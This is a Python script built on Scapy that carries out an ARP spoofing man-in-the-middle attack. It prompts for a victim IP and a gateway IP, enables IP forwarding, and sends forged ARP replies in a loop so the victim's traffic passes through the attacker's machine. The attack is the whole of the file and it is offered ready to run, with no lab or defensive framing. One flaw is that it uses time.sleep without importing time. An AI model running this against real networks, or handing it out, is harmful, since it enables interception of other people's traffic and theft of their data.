from scapy.all import *
import os
import sys
import threading

# Define a class that handles the ARP spoofing attack
class ArpSpoof:
    def __init__(self, victim_ip, gateway_ip):
        """
        Initialize the ArpSpoof class with the victim's and gateway's IP addresses.
        This method also finds the MAC addresses for the victim and gateway.
        """
        self.victim_ip = victim_ip  # IP address of the victim (the device we want to attack)
        self.gateway_ip = gateway_ip  # IP address of the gateway (usually the router)
        self.victim_mac = self.get_mac(self.victim_ip)  # Get the MAC address of the victim
        self.gateway_mac = self.get_mac(self.gateway_ip)  # Get the MAC address of the gateway

        # If the MAC addresses can't be found, the script exits
        if not self.victim_mac or not self.gateway_mac:
            print("Could not find MAC addresses. Exiting...")
            sys.exit(1)

    def get_mac(self, ip):
        """
        Sends a request to get the MAC address associated with the given IP address.
        Returns the MAC address if found.
        """
        answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, retry=10)
        for send, receive in answered:
            return receive[Ether].src  # The MAC address is extracted from the response
        return None  # Return None if the MAC address wasn't found

    def spoof(self, target_ip, target_mac, spoof_ip):
        """
        Sends a fake ARP response to the target, tricking it into thinking that 
        our machine's MAC address is associated with the IP address we want to spoof.
        """
        # Create the ARP response packet
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(arp_response, verbose=False)  # Send the ARP packet (no verbose output)

    def restore(self, target_ip, target_mac, spoof_ip, spoof_mac):
        """
        Sends the correct ARP response to restore the target's ARP cache back to normal.
        This undoes the spoofing by telling the target the correct MAC address.
        """
        # Create the ARP response packet with the correct information
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
        send(arp_response, count=4, verbose=False)  # Send the ARP packet multiple times

    def start(self):
        """
        Starts the MITM attack by continuously sending spoofed ARP packets to both the victim and the gateway.
        Also enables IP forwarding to allow traffic to pass through the attacker's machine.
        """
        # Enable IP forwarding on the attacker's machine to allow traffic to flow through it
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

        print(f"Starting MITM attack on {self.victim_ip}...")

        try:
            # Continuously send spoofed ARP responses to the victim and gateway
            while True:
                self.spoof(self.victim_ip, self.victim_mac, self.gateway_ip)  # Spoof victim
                self.spoof(self.gateway_ip, self.gateway_mac, self.victim_ip)  # Spoof gateway
                time.sleep(2)  # Wait for 2 seconds before sending the next spoof
        except KeyboardInterrupt:
            # If the user stops the attack, restore the ARP tables to their correct state
            print("Restoring ARP tables...")
            self.restore(self.victim_ip, self.victim_mac, self.gateway_ip, self.gateway_mac)
            self.restore(self.gateway_ip, self.gateway_mac, self.victim_ip, self.victim_mac)
            print("Attack stopped.")
            sys.exit(0)

# The script starts execution here
if __name__ == "__main__":
    # Check if the script is run as root (necessary for network operations)
    if os.geteuid() != 0:
        print("Run this script as root!")  # Print a message if not running as root
        sys.exit(1)

    # Get the victim's IP address from the user
    victim_ip = input("Enter the victim's IP: ")
    # Get the gateway's IP address (usually the router) from the user
    gateway_ip = input("Enter the gateway IP: ")

    # Create an instance of the ArpSpoof class with the provided IP addresses
    mitm_attack = ArpSpoof(victim_ip, gateway_ip)
    # Start the attack in a separate thread so it doesn't block the main program
    attack_thread = threading.Thread(target=mitm_attack.start)
    attack_thread.start()
